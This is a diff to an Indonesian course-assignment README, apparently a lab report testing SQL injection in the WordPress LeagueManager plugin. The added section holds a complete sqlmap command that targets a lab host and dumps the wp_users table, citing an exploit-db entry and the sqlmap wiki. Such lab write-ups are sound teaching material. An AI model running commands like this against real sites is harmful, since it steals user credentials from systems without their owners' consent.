@@ -1,4 +1,4 @@
-# PKSJ - Tugas 1
+# PKSJ - Tugas 2
 
 ## Pendahuluan
 
@@ -123,7 +123,19 @@ Hasil Uji dengan sqlmap dengan command seperti diatas adalah
 
 ![Hasil Skenario 1](leaguemanager_3.9.11/15.PNG)
 
-Sumber referensi : https://www.exploit-db.com/exploits/37182/
+- Menggunakan SqlMap untuk mendapatkan isi dari table wp_users.
+```
+python sqlmap.py --url "http://10.151.36.5/html/index.php/2016/10/12/tik/?match=3" --dbms mysql --level 5 --risk 3 -D wordpress -T wp_users --dump
+```
+Hasil Uji dengan sqlmap dengan command seperti diatas adalah
+
+![Hasil Skenario 1](leaguemanager_3.9.11/16.PNG)
+
+![Hasil Skenario 1](leaguemanager_3.9.11/17.PNG)
+
+Sumber referensi : 
+https://www.exploit-db.com/exploits/37182/
+https://github.com/sqlmapproject/sqlmap/wiki/Usage
 
 ####3. Uji Sql Injection terhadap plugin wordpress video player v.1.5.16
 
